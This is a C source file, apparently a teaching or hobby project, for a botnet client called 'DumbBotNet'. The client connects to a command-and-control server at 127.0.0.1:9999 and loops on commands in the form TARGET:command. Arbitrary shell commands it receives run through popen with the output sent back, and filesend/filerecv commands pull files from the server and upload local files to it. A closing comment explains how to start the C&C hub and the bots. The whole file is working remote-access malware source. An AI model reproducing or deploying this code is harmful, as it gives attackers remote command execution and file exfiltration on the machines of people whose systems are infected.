//Include necessary libraries//
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//errno.h defines integer variable errno in an event of an error to indicate what has went wrong//
#include <errno.h>
//Define miscellaneous constants and symbolic constants//
#include <unistd.h>
//Allows socket programming//
#include <sys/socket.h>
//Defines standard types and structures for network programming
#include <netinet/in.h>
//Defines standard structures for internet operations
#include <arpa/inet.h>

#define CC_SERVER "127.0.0.1"
#define CC_PORT 9999
#define MAX_BUF 9216

//for error messages
#define PEXIT(str) {perror (str); exit(1);}

static char *bot_id = NULL;

//write function
int bot_print (int s, char *str)
{
  //write (int filedescriptor,const void * buffer,size)
  return write (s, str, strlen(str));
}

//read function
int bot_read (int s, char *msg)
{
  //memset (void *str, int c, size_t n)
  //allocates memory of size_t and sets the * with character c
  //str is pointer to a block of memory
  memset (msg, 0, MAX_BUF);
  //read returns size of text piped into a buffer
  // if size is less than 0 then there is some error
  if (read (s, msg, MAX_BUF)  <= 0)
    PEXIT ("bot_read:");

  return 0;
}
//function for running custom commands
int bot_run_cmd (int s, char *cmd)
{
  char  line[1024];
  FILE *f = popen (cmd,"r");

  if (!f) return -1;
  while (!feof (f))
    {
      if (!fgets (line, 1024, f)) break;
      bot_print (s, bot_id);
      bot_print (s, ":");
      bot_print (s, line);
    }
  fclose(f);

  return 0;
}
//receive file from server
int filesend(int s , char *cmd)
{
  char* fr_name = cmd;
  int LENGTH = 512;
  char revbuf[LENGTH];
  FILE *fr = fopen(fr_name, "w");
  bot_print(s,"CODEFSEND");
  bot_print (s, "^");
  bot_print(s,cmd);
  if(fr == NULL)
  {
    printf("File %s Cannot be opened.\n", fr_name);
    bot_print (s, bot_id);
    bot_print (s, ":");
    bot_print(s,"file cannot be opened");
  }
  else
  {
    bzero(revbuf, LENGTH);
    int fr_block_sz = 0;
    while((fr_block_sz = recv(s, revbuf, LENGTH, 0)) > 0)
    {
      int write_sz = fwrite(revbuf, sizeof(char), fr_block_sz, fr);
      if(write_sz < fr_block_sz)
      {
              perror("File write failed.\n");
      }
      bzero(revbuf, LENGTH);
      if (fr_block_sz == 0 || fr_block_sz != 512)
      {
        break;
      }
  }
  if(fr_block_sz < 0)
  {
    if (errno == EAGAIN)
    {
      printf("recv() timed out.\n");
    }
    else
    {
      fprintf(stderr, "recv() failed due to errno = %d\n", errno);
    }
  }
    printf("Ok received from server!\n");
    bot_print(s,"received from server");
    fclose(fr);
  }
  return 0;
}
//sending the file to server
int filerecv(int s,char* filename)
{
  int LENGTH = 512;
  char sdbuf[LENGTH]; // Send buffer
  int response;
  printf("From client to server %s...", filename);
  response = recv(s,sdbuf,LENGTH,0);
  printf("%s\n",sdbuf);
  if(strcasecmp(sdbuf,"READY") == 0)
  {
    FILE *fs = fopen(filename, "r");
    if(fs == NULL)
    {
        //fprintf(stderr, "ERROR: File %s not found on server. (errno = %d)\n", filename, errno);
        exit(1);
    }

    bzero(sdbuf, LENGTH);
    int fs_block_sz;

    while((fs_block_sz = fread(sdbuf, sizeof(char), LENGTH, fs))>0)
    {
        //printf("%s",sdbuf);
        if(send(s, sdbuf, fs_block_sz, 0) < 0)
        {
          //  fprintf(stderr, "ERROR: Failed to send file %s. (errno = %d)\n", fliename, errno);
            exit(1);
        }
        bzero(sdbuf, LENGTH);
    }
    printf("Ok sent to server!\n");
    //success = 1;
    //close(nsockfd);
    //printf("[Server] Connection with Client closed. Server will wait now...\n");
    //while(waitpid(-1, NULL, WNOHANG) > 0);
}
else{
  bot_print(s,"unable to download");
}
  return 0;

}

int bot_parse (int s, char *msg)
{
  char *target = msg;
  char *cmd = NULL;
  char *filename;
  if ((cmd = strchr (msg, ':')) == NULL)
    {
      printf ("!! Malformed command. Should be TARGET:command\n");
      return -1;
    }
  *cmd = 0;
  cmd++;
  cmd[strlen(cmd) - 1] = 0;



  if (strcasecmp (target, "all") && strcasecmp(target, bot_id))
    return 0; // Silently ignore messages not for us
  printf("cmd: %s \n",cmd);
  if (strchr(cmd,':'))
  {

      filename=strchr(cmd,':');
      *filename=0;
      filename++;
      // printf("cmd: %s \n",cmd);
      // printf("file: %s \n",filename);

      if(strcasecmp(cmd,"filesend") == 0)
      {
        printf("filesend is starting \n");
        filesend(s,filename);
      }
      else if (strcasecmp(cmd,"filerecv") == 0)
      {
        printf("file receiving  is starting \n");
        bot_print(s,"CODEFRECV");
        bot_print(s,"^");
        bot_print(s,filename);
        filerecv(s,filename);

      }
      return 0;
  }
  else{
    printf ("+ Executing command: '%s'\n", cmd);
    bot_run_cmd (s, cmd);
  }
  return 0;
}


int bot_connect_cc (char *ip, int port)
{
  char                 msg[1024];
  struct sockaddr_in   server;
  int                  s;

  server.sin_addr.s_addr = inet_addr(ip);
  server.sin_family = AF_INET;
  server.sin_port = htons(port);

  if ((s = socket (PF_INET, SOCK_STREAM, 0)) < 0)
    PEXIT ("socket:");
  if ((connect (s, (struct sockaddr*) &server, sizeof(server))) < 0)
    PEXIT ("conect:");
  snprintf (msg, 1024, "%s: This is '%s' Up and Running\n", bot_id, bot_id);
  bot_print (s, msg);

  return s;
}

//this is where the [program starts]
int main (int argc, char* argv[])
{
  char  msg[MAX_BUF];
  int   cc_s;

  if (argc !=2) PEXIT ("Invalid Number Of Arguments:");
  bot_id = strdup (argv[1]);

  printf ("'%s' joining the DumbBotNet\n", bot_id);
  cc_s = bot_connect_cc (CC_SERVER, CC_PORT);
  while (1)
    {
      bot_read (cc_s, msg);
      bot_parse (cc_s, msg);
    }
}

// C&C : nk -hub -s T,9999
// Bots: ./bot BotName
